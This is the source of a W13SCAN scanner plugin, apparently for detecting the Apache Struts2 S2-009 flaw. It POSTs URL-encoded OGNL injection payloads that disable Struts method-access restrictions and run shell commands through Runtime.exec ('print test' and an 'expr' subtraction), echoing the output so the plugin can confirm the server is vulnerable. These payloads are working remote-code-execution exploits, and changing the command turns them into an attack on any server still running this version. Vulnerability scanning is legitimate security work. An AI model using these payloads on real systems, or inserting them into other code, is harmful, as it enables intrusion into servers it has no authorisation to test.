#coding   :utf-8
#file     : struts2_009.py
#author   : go0p
#time     : 2019/8/17 4:43 PM
#software :PyCharm

import copy
import os
import random
import requests

from W13SCAN.lib.common import prepare_url
from W13SCAN.lib.const import acceptedExt, ignoreParams, Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'struts2-009'
    desc = '''暂未测试'''
    level = Level.HIGHT

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL
        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if self.response.language and self.response.language != "JAVA":
            return
        if method == 'GET':
            exi = os.path.splitext(p.path)[1]
            if exi not in acceptedExt:
                return

            ran_a = random.randint(10000000, 20000000)
            ran_b = random.randint(1000000, 2000000)
            ran_check = ran_a - ran_b
            lin = 'expr' + ' ' + str(ran_a) + ' - ' + str(ran_b)

            checks = [str(ran_check), '无法初始化设备 PRN', '??????? PRN', 'Struts2-vuln-Check',
                     'Unable to initialize device PRN']
            payloads = [
                r'class.classLoader.jarPath=%28%23context["xwork.MethodAccessor.denyMethodExecution"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27print test%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]',
                r'class.classLoader.jarPath=%28%23context["xwork.MethodAccessor.denyMethodExecution"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27' + lin + '%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]',
                r'''class.classLoader.jarPath=%28%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23outstr%3d@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2c%23outstr.print%28%22Struts2-%22%29%2c%23outstr.println%28%22vuln-Check%22%29%2c%23outstr.close%28%29%29%28meh%29&z%5b%28class.classLoader.jarPath%29%28%27meh%27%29%5d='''
            ]
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            for payload in payloads:
                r = requests.post(url, headers=headers,data=payload)
                html1 = r.text
                for ckeck in checks:
                    if ckeck in html1:
                        out.success(url, self.name, playload="{}".format(payload), method=method,check=ckeck,raw=r.raw)
                        return
